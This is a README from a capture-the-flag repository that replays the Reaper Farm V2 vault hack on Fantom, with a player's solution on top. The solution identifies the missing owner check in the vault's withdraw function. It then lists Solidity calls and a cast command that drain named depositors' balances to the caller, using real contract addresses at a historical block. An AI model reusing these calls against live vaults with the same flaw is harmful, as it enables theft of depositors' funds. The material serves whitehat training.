# solution - LCFR.eth

wasted much time on trying to find a way to programatically read storage of balance mapping to do this automated. :(

Vulnerable Function: 
```bash
function withdraw(uint256 assets, address receiver, address owner) external nonReentrant returns (uint256 shares) {
        require(assets != 0, "please provide amount");
        shares = previewWithdraw(assets);
        _withdraw(assets, shares, receiver, owner);
        return shares;
}

function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal returns (uint256) {
        _burn(owner, shares); // [0] LCFR
        ...
        return assets;
}
```

no validation on msg.sender == owner == rekt

Exploit:
```bash
reaper.withdraw(reaper.maxWithdraw(0xEB7a12fE169C98748EB20CE8286EAcCF4876643b), address(this), 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b);
reaper.withdraw(reaper.maxWithdraw(0x056abd53a55C187d738B4A982D36b4dFa506326A), address(this), 0x056abd53a55C187d738B4A982D36b4dFa506326A);
reaper.withdraw(reaper.maxWithdraw(0x954773dD09a0bd708D3C03A62FB0947e8078fCf9), address(this), 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9);
reaper.withdraw(reaper.maxWithdraw(0xB573f01f2901c0dB3E14Ec80C6E12e4868DEC864), address(this), 0xB573f01f2901c0dB3E14Ec80C6E12e4868DEC864);
reaper.withdraw(reaper.maxWithdraw(0xfc83DA727034a487f031dA33D55b4664ba312f1D), address(this), 0xfc83DA727034a487f031dA33D55b4664ba312f1D);
```

Exploit with cast:
```bash
cast call --rpc-url $RPC --block 44000000 0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A "withdraw(uint256, address, address)" 272475965085592826065349 0x328eBc7bb2ca4Bf4216863042a960E3C64Ed4c10 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b | cast 2d
```

files: 
test/ReaperHack.t.sol - main foundry exploit testcase

reapDeposits.py - an attempt to programattically find all depositors from when deposits started to automatically clear all the contracts held funds.


## welcome to unhacked

_unhacked_ is a weekly ctf, giving whitehats the chance to go back in time before real exploits and recover funds before the bad guys get them. 

_you are a whitehat, right anon?_

## meet reaper

[reaper farm](https://www.reaper.farm/) is a yield aggregator on fantom. their V2 vaults were hacked on 8/2.

there were a number of implementations of the vaults with damages totalling $1.7mm, but the exploit was the same on all of them, so let's just focus on one ?????a DAI vault hacked for over $400k.

- vault: [0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A](https://ftmscan.com/address/0x77dc33dc0278d21398cb9b16cbff99c1b712a87a)
- fantom dai: [0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E](https://ftmscan.com/address/0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E)

review the code in this repo, find the exploit, and recover > $400k.

## how to play

1. fork this repo and clone it locally.

2. update the .env file with an environment variable for FANTOM_RPC (already preset to the public RPC endpoint, which should work fine, in which case you can skip this).

3. review the code in the `src/` folder, which contains all the code at the time of the hack. you can explore the state of the contract before the hack using block 44000000. ex: `cast call --rpc-url ${FANTOM_RPC} --block 44000000 0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A "totalAssets()" | cast 2d`

4. when you find an exploit, code it up in `ReaperHack.t.sol`. the test will pass if you succeed.

5. post on twitter for bragging rights and tag [@unhackedctf](http://twitter.com/unhackedctf). no cheating.

## subscribe

for new weekly challenges and solutions, subscribe to the [unhacked newsletter](https://unhackedctf.substack.com/publish/post/69864558).
